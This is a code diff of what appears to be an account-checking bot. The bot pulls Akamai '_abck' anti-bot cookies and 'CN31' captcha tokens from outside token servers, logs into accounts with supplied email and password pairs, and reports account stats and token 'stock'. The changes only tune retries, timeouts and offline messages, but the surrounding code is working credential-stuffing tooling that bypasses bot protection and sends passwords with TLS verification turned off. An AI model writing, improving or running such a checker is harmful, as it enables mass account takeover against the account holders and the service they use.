@@ -352,11 +352,9 @@ def is_valid_abck(token):
 
 def fetch_abck_token_semi(exclude=None):
     excluded = set(exclude) if exclude else set()
-    attempt = 0
-    while True:
-        attempt += 1
+    for attempt in range(10):
         try:
-            r = requests.get(ABCK_SERVER + ABCK_ENDPOINT, params={"count": 1}, timeout=15)
+            r = requests.get(ABCK_SERVER + ABCK_ENDPOINT, params={"count": 1}, timeout=10)
             if r.status_code == 200:
                 data = r.json()
                 for key in ["_abck", "abck", "token", "cookie", "value"]:
@@ -364,29 +362,31 @@ def fetch_abck_token_semi(exclude=None):
                     if not is_valid_abck(val):
                         continue
                     if val in excluded:
-                        time.sleep(5)
+                        time.sleep(3)
                         break
                     try:
                         requests.post(ABCK_SERVER + ABCK_SAVE_ENDPOINT, json={"token": val}, timeout=8)
                     except Exception:
                         pass
                     return val
-            time.sleep(3)
+            time.sleep(2)
         except Exception:
-            time.sleep(3)
+            time.sleep(2)
+    return None
 
 def fetch_cn31_token_semi():
     global _cn31_spinner_idx
-    while True:
+    for attempt in range(10):
         try:
-            resp = requests.get(CN31_SERVER, timeout=15)
+            resp = requests.get(CN31_SERVER, timeout=10)
             data = resp.json()
             token = data.get("token", "")
             if isinstance(token, str) and token.startswith("CN31_") and len(token) > 20:
                 return token
-            time.sleep(3)
+            time.sleep(2)
         except Exception:
-            time.sleep(3)
+            time.sleep(2)
+    return None
 
 def get_stats_semi(jwt):
     headers = {
@@ -442,6 +442,8 @@ def build_battle_info_semi(stats_json, jwt):
 
 def do_semi_check(email, password):
     cap = fetch_cn31_token_semi()
+    if not cap:
+        return None, "CN31 server unreachable — check stock and try again"
     p   = md5(password)
     params = {
         "account": email,
@@ -458,6 +460,8 @@ def do_semi_check(email, password):
         "lang": "en"
     }
     abck = fetch_abck_token_semi()
+    if not abck:
+        return None, "Akamai server unreachable — check stock and try again"
     session = requests.Session()
     session.headers.update({
         "User-Agent": "Mozilla/5.0",
@@ -1378,13 +1382,17 @@ def fetch_stock_summary():
 
 def fetch_akamai_stock():
     try:
-        r = requests.get(AKAMAI_API, timeout=10)
+        r = requests.get(AKAMAI_API, timeout=8)
         d = r.json()
-        pool   = d.get("pool_size") or d.get("pool") or d.get("count") or d.get("total") or d.get("size") or "?"
-        served = d.get("tokens_served") or d.get("served") or d.get("used") or d.get("total_served") or "?"
-        rate   = d.get("rate_per_min") or d.get("rate") or d.get("speed") or "?"
-        uptime = int(d.get("uptime_minutes") or d.get("uptime") or 0)
+        pool   = d.get("pool_size", "?")
+        served = d.get("tokens_served", "?")
+        rate   = d.get("rate_per_min", "?")
+        uptime = int(d.get("uptime_minutes") or 0)
         return pool, served, rate, uptime
+    except requests.exceptions.ConnectTimeout:
+        return "OFFLINE", "OFFLINE", "OFFLINE", 0
+    except requests.exceptions.ConnectionError:
+        return "UNREACHABLE", "UNREACHABLE", "UNREACHABLE", 0
     except Exception:
         return "N/A", "N/A", "N/A", 0
 
@@ -1416,12 +1424,15 @@ def build_cn31_msg():
     cn_pool, cn_served, cn_workers, cn_gen = fetch_cn31_stock()
     sep     = "────────────────────────"
     now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    offline = str(cn_pool) in ("OFFLINE", "UNREACHABLE", "ERROR")
+    status  = f"  <b>⚠ SERVER {cn_pool}</b>\n  Checking may fail until server is back.\n" if offline else ""
     msg  = f"{sep}\n  <b>CN31 STOCK</b>\n{sep}\n\n"
+    msg += status
     msg += f"  Stock: {cn_pool}\n"
     msg += f"  Served: {cn_served}\n"
     msg += f"  Generated: {cn_gen}\n"
     msg += f"  Workers: {cn_workers}\n"
-    msg += f"  Last Served: {now_str}\n"
+    msg += f"  Last Checked: {now_str}\n"
     return msg
 
 def main_menu_keyboard(uid=None, db=None):
@@ -1516,7 +1527,7 @@ def check_single_thread(login, password, uid, chat_id, context, st_obj, app_loop
         return
 
     try:
-        r    = requests.get(API_URL, params={"login": login, "password": password}, timeout=120, verify=False)
+        r    = requests.get(API_URL, params={"login": login, "password": password}, timeout=60, verify=False)
         data = r.json()
     except requests.exceptions.Timeout:
         with lock:
